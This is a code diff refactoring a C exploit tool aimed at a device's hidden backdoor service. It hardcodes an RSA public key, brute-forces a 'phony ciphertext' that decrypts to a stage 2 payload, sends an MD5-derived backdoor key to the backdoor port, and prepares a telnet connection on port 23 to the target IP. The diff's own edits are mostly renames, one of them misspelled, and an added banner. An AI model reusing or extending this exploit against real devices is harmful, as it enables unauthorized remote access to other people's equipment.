@@ -78,6 +78,11 @@ char *device_identifying_hash() {
 
 ////// RSA stuff
 
+#define HARDCODED_n  "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD724AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B388451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7AF52829E9F858691"
+
+#define HARDCODED_e 0x10001
+
+
 RSA *init_rsa() {
   BIGNUM *e;
   BIGNUM *n;
@@ -85,14 +90,14 @@ RSA *init_rsa() {
   rsa = RSA_new();
   n = BN_new();
   e = BN_new();
-  BN_set_word(e,0x10001);
-  BN_hex2bn(&n, "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD724AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B388451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7AF52829E9F858691");
+  BN_set_word(e, HARDCODED_e);
+  BN_hex2bn(&n,  HARDCODED_n);
   rsa->e = e;
   rsa->n = n;
 }
 
 
-int decrypt(RSA *rsa, char *ciphertext, char *plaintext) {
+int decrypt_with_pubkey(RSA *rsa, char *ciphertext, char *plaintext) {
   int sz;
   memset(plaintext, 0, PLAINTEXT_LENGTH);
   sz = RSA_size(rsa);
@@ -101,7 +106,7 @@ int decrypt(RSA *rsa, char *ciphertext, char *plaintext) {
 }
 
 
-int encrypt(RSA *rsa, char *plaintext, char *ciphertext) {
+int encrypy_with_pubkey(RSA *rsa, char *plaintext, char *ciphertext) {
   int sz;
   memset(ciphertext,0,CIPHERTEXT_LENGTH);
   sz = RSA_size(rsa);
@@ -168,7 +173,7 @@ int test() {
   };
 
   printf("[=] Test case: '%s'\n", test_case);
-  encrypt(rsa, test_case, ciphertext);
+  encrypy_with_pubkey(rsa, test_case, ciphertext);
 
   res = memcmp(ciphertext, expected, CIPHERTEXT_LENGTH);
   if (res != 0) {
@@ -270,7 +275,7 @@ char *find_phony_ciphertext(RSA *rsa) {
     for (i = 0; i < PLAINTEXT_LENGTH; i++) {
       phony_ciphertext[i] = rand() & 0xFF;
     }
-    decrypt(rsa, phony_ciphertext, phony_plaintext); 
+    decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
     for (i = 0x21; i < 0x7f; i++) {
       if (phony_plaintext[0] ^ (unsigned char) i == 0x00) {
         fprintf(stderr, "[!] Found stage 2 payload:\n");
@@ -313,7 +318,7 @@ int main(int argc, char **argv) {
     fprintf(stderr, "[+] Read data:\n");
     fhexdump(stderr, plaintext, PLAINTEXT_LENGTH);
     fprintf(stderr, "[+] Encrypting plaintext '%s' of length %ld\n", plaintext, strlen(plaintext));
-    encrypt(rsa, plaintext, ciphertext);
+    encrypy_with_pubkey(rsa, plaintext, ciphertext);
     hexdump(ciphertext, CIPHERTEXT_LENGTH);
     exit(0);
   } else if (!(strcmp(argv[1], "dec"))) {
@@ -322,9 +327,9 @@ int main(int argc, char **argv) {
     fprintf(stderr, "[+] Read data:\n");
     fhexdump(stderr, ciphertext, CIPHERTEXT_LENGTH);
     fprintf(stderr, "[+] Decrypting with public key...\n");
-    decrypt(rsa, ciphertext, plaintext);
+    decrypt_with_pubkey(rsa, ciphertext, plaintext);
     hexdump(plaintext, PLAINTEXT_LENGTH);
-    fprintf(stderr, "[+] strlen(decrypt(payload)) = %ld\n", strlen(plaintext)); 
+    fprintf(stderr, "[+] strlen(decrypt_with_pubkey(payload)) = %ld\n", strlen(plaintext)); 
     //print_temp_key(plaintext);
     exit(0);
   }
@@ -342,6 +347,8 @@ int main(int argc, char **argv) {
   int tries = 100;
   char *telnet_command;
   
+  printf("[+] Initializing RSA Cipher with:\n- hardcoded e: 0x%X\n- hardcoded n: 0x%s\n- no padding\n", HARDCODED_e, HARDCODED_n);
+
   rsa = init_rsa();
   telnet_command = malloc(0x80 * sizeof(char));
   sprintf(telnet_command, "telnet %s 23", ip_addr);
@@ -389,7 +396,7 @@ int main(int argc, char **argv) {
     printf("[*] ENTERING STAGE III\n");
     bar('=');
     memset(backdoor_key, 0, 0x10);
-    printf("[+] Sending MD5('%s') and hoping our phony ciphertext collides with secret[0]...\n",
+    printf("[+] Sending MD5('%s') and hoping for collision...\n",
         magic_salt);
     md5raw(backdoor_key, magic_salt, strlen(magic_salt));
     communicate(ip_addr, BACKDOOR_PORT,
